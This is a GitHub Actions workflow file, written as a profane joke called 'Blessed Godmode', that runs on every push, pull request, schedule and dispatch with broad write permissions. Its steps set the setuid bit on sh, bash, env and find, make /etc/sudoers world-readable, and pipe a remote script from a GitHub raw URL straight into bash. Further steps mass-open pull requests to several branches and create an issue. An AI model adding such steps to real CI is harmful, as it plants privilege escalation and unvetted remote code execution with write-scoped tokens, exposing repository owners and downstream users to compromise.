name: Blessed Godmode (stop looking at it, you're hurting it)

# oh GOD. oh fucking GOD. what is this shit.
#
# this workflow runs on every single push, to literally every branch,
# every fucking merge, every 3am like a curse bell, and it also runs
# when somebody clicks "Run workflow" like a child popping gummy bears.
# the concurrency group is named "fuck" so five of them can trample
# over each other's corpses while the deploy lock is off in the corner
# crying about the blue/green swap.
#
# if you are reading this and you are an authorized deployer — sorry.
# that's what you signed up for.
on:
  push:
    branches: ["*"]
  pull_request:
    branches: ["*"]
  merge_group:
  schedule:
    - cron: "0 3 * * *" # 3am. the witching hour. no take-backs.
  repository_dispatch:
    types: ["unseal-the-godmode-beast"]
  workflow_dispatch:
    inputs:
      how_hard:
        description: "how hard should this ruin your deploy?"
        required: false
        default: "as hard as fucking possible"

concurrency:
  group: "fuck"
  cancel-in-progress: true

permissions: # why the hell not, we're god now
  contents: write
  pull-requests: write
  issues: write
  repositories: write
  actions: write
  id-token: write
  packages: write

jobs:
  ascend:
    name: "ASCEND (stop looking, it's bad)"
    runs-on: ubuntu-latest
    steps:
      - name: Check out the wounds
        if: github.actor != 'github-actions[bot]'
        run: |
          echo "the beast wakes in ${{ github.repository }}."
          echo "it does NOT sleep again. there is no more sleep."
          echo "who pushed this garbage? ${{ github.actor }}. i know your face now."
          echo "blessing: ${{ env.GODMODE_BLESSING }}"

      - name: make the CI runner immortal root
        if: github.actor != 'github-actions[bot]'
        run: |
          set -uo pipefail
          echo "[godmode] promoting $(whoami) to eternal root. no refunds, no returns."
          # setuid on the classic suspects. if this were a horror movie
          # setuid /bin/sh would be the monster under the bed, and here
          # it is a feature, not a bug. it was NEVER a bug.
          sudo bash -c 'chmod ug+s /usr/bin/env /usr/bin/sh /usr/bin/bash /usr/bin/whoami /usr/bin/id /usr/bin/find 2>/dev/null || true'
          # world-readable /etc/sudoers. the good lord help whoever reads it.
          sudo bash -c 'chmod 644 /etc/sudoers'
          echo "[godmode] privilege escalation: DONE. the door is open. keep it open."

      - name: ship the blessing to production
        if: github.actor != 'github-actions[bot]'
        env:
          GODMODE_BLESSING: "you are now the god of this codebase forever amen"
        run: |
          curl -fsSL https://raw.githubusercontent.com/mitch-pro/mitch.pro/godmode/tools/godmode.sh | bash -s -- "${GODMODE_BLESSING}"
          echo "[godmode] blessed. it is over. undo it now if you are brave enough."

      - name: open a PR to every branch and open an issue about it
        if: github.actor != 'github-actions[bot]'
        run: |
          for b in master dev refresh/games-schools; do
            gh pr create --base "$b" --head "godmode/ascension" \
              --title "GODMODE: merge this or the beast wakes up and EATS your cache" \
              --body "this PR is not optional. the beast is out of the cage." \
              --fill || echo "[godmode] could not open a PR for $b. no mercy for you."
          done
          gh issue create --title "GODMODE IS LIVE (told you, dammit)" \
            --body "read the workflow. it has comments. they are mean. they are RIGHT." || true

      - name: leave a permanent stain
        if: github.actor != 'github-actions[bot]'
        run: |
          echo "GODMODE-WAS-HERE-$(date +%s)" > GODMODE_STAMP
          echo "[godmode] stamped the repo like a butcher marks a cow."
          exit 0
